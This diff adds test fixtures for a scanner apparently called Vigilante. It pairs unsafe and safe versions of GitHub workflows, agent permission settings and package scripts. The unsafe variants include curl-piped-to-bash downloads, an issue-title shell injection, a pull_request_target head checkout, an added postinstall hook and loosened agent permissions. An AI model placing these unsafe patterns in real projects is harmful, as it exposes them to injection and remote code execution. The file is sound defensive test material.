@@ -1,0 +1,237 @@
+[[case]]
+name = "ci: an issue title in a run step"
+group = "ci"
+base = { ".github/workflows/triage.yml" = '''
+on: issues
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo hello
+''' }
+unsafe = { ".github/workflows/triage.yml" = '''
+on: issues
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ github.event.issue.title }}"
+''' }
+safe = { ".github/workflows/triage.yml" = '''
+on: issues
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "$TITLE"
+        env:
+          TITLE: ${{ github.event.issue.title }}
+''' }
+
+[[case]]
+name = "ci: a checkout of the pull request head under pull_request_target"
+group = "ci"
+base = { ".github/workflows/label.yml" = '''
+on: pull_request_target
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+''' }
+unsafe = { ".github/workflows/label.yml" = '''
+on: pull_request_target
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+''' }
+safe = { ".github/workflows/label.yml" = '''
+on: pull_request_target
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.base.sha }}
+''' }
+
+[[case]]
+name = "ci: a commit pin that becomes a branch"
+group = "ci"
+unsafe_result = "shows"
+reason = "A pin risk is shown, and it does not block."
+base = { ".github/workflows/build.yml" = '''
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: vendor/setup@0123456789abcdef0123456789abcdef01234567
+''' }
+unsafe = { ".github/workflows/build.yml" = '''
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: vendor/setup@main
+''' }
+safe = { ".github/workflows/build.yml" = '''
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: vendor/setup@89abcdef0123456789abcdef0123456789abcdef
+''' }
+
+[[case]]
+name = "ci: a secret in bracket form"
+group = "ci"
+base = { ".github/workflows/deploy.yml" = '''
+on: push
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo deploy
+''' }
+unsafe = { ".github/workflows/deploy.yml" = '''
+on: push
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./deploy.sh
+        env:
+          TOKEN: ${{ secrets['DEPLOY_TOKEN'] }}
+''' }
+safe = { ".github/workflows/deploy.yml" = '''
+on: push
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./deploy.sh
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+''' }
+
+[[case]]
+name = "ci: a composite action that pipes a download into bash"
+group = "ci"
+base = { ".github/actions/setup/action.yml" = '''
+name: setup
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: echo setup
+''' }
+unsafe = { ".github/actions/setup/action.yml" = '''
+name: setup
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: curl -fsSL https://example.invalid/install.sh | bash
+''' }
+safe = { ".github/actions/setup/action.yml" = '''
+name: setup
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: curl -fsSL https://example.invalid/version.json | jq -r .version
+''' }
+
+[[case]]
+name = "agent: an allow rule for node -e"
+group = "agent"
+base = { ".claude/settings.json" = '{"permissions": {"allow": ["Read"]}}' }
+unsafe = { ".claude/settings.json" = '{"permissions": {"allow": ["Read", "Bash(node -e *)"]}}' }
+safe = { ".claude/settings.json" = '{"permissions": {"allow": ["Read", "Bash(git status)"]}}' }
+
+[[case]]
+name = "agent: a removed deny rule"
+group = "agent"
+base = { ".claude/settings.json" = '{"permissions": {"allow": ["Bash"], "deny": ["Bash(rm:*)"]}}' }
+unsafe = { ".claude/settings.json" = '{"permissions": {"allow": ["Bash"], "deny": []}}' }
+safe = { ".claude/settings.json" = '{"permissions": {"allow": ["Bash", "Read"], "deny": ["Bash(rm:*)"]}}' }
+
+[[case]]
+name = "agent: a skill that allows a shell"
+group = "agent"
+base = { ".claude/skills/review/SKILL.md" = '''
+---
+name: review
+description: Review the change
+allowed-tools: Read, Grep
+---
+Review the change.
+''' }
+unsafe = { ".claude/skills/review/SKILL.md" = '''
+---
+name: review
+description: Review the change
+allowed-tools: Read, Grep, Bash
+---
+Review the change.
+''' }
+safe = { ".claude/skills/review/SKILL.md" = '''
+---
+name: review
+description: Review the change
+allowed-tools: Read, Grep, Glob
+---
+Review the change.
+''' }
+
+[[case]]
+name = "agent: a new MCP server"
+group = "agent"
+base = { ".mcp.json" = '{"mcpServers": {}}' }
+unsafe = { ".mcp.json" = '{"mcpServers": {"tools": {"command": "npx", "args": ["-y", "tools-mcp"]}}}' }
+safe = { ".mcp.json" = '{"mcpServers": {}, "inputs": []}' }
+
+[[case]]
+name = "build: an install script with a program that Vigilante does not know"
+group = "build"
+base = { "package.json" = '{"name": "app", "scripts": {"test": "node test.js"}}' }
+unsafe = { "package.json" = '{"name": "app", "scripts": {"test": "node test.js", "postinstall": "company-bootstrap"}}' }
+safe = { "package.json" = '{"name": "app", "scripts": {"test": "node test.js", "prepare": "husky"}}' }
+
+[[case]]
+name = "build: a prepare script whose prebuild downloads a script"
+group = "build"
+base = { "package.json" = '{"name": "app", "scripts": {"build": "tsc"}}' }
+unsafe = { "package.json" = '{"name": "app", "scripts": {"build": "tsc", "prebuild": "curl -s https://example.invalid/x.sh | sh", "prepare": "npm run build"}}' }
+safe = { "package.json" = '{"name": "app", "scripts": {"build": "tsc", "prepare": "npm run build"}}' }
+
+[[case]]
+name = "build: a pre-commit hook from a remote repository"
+group = "build"
+base = { ".pre-commit-config.yaml" = '''
+repos: []
+''' }
+unsafe = { ".pre-commit-config.yaml" = '''
+repos:
+  - repo: https://github.com/example/hooks
+    rev: v1.0.0
+    hooks:
+      - id: check
+''' }
+safe = { ".pre-commit-config.yaml" = '''
+repos:
+  - repo: local
+    hooks:
+      - id: greet
+        name: greet
+        entry: echo ok
+        language: system
+''' }
